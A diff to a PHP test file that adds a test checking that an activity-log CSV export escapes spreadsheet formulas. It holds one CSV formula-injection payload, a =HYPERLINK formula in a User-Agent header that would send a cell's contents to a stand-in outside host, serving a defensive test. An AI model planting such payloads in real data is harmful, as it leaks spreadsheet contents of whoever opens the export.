@@ -160,6 +160,20 @@ class ActivityLogTest extends TestCase
         $this->assertDatabaseHas('activity_log', ['action' => 'registo.exportado', 'user_id' => $admin->id]);
     }
 
+    public function test_the_export_does_not_run_formulas_in_excel(): void
+    {
+        $admin = $this->user('admin');
+        // Uma entrada falhada com um "browser" que é uma fórmula do Excel
+        $this->withHeaders(['User-Agent' => '=HYPERLINK("https://x.test/?"&A2;"ver")'])->post('/login', ['email' => 'x@exemplo.test', 'password' => 'errada']);
+
+        $csv = $this->actingAs($admin)->get('/administracao/registo/exportar?grupo=contas')->assertOk()->streamedContent();
+
+        $this->assertStringContainsString("'=HYPERLINK", $csv);
+        $this->assertSame("'+1", \App\Support\Csv::cell('+1'));
+        $this->assertSame('Ana', \App\Support\Csv::cell('Ana'));
+        $this->assertSame(-5, \App\Support\Csv::cell(-5)); // números ficam como estão
+    }
+
     public function test_every_action_the_code_records_has_a_sentence_and_a_group(): void
     {
         $files = ['app/Support/ActivityRecorder.php', 'app/Services/LearningService.php', 'app/Services/TeamService.php',
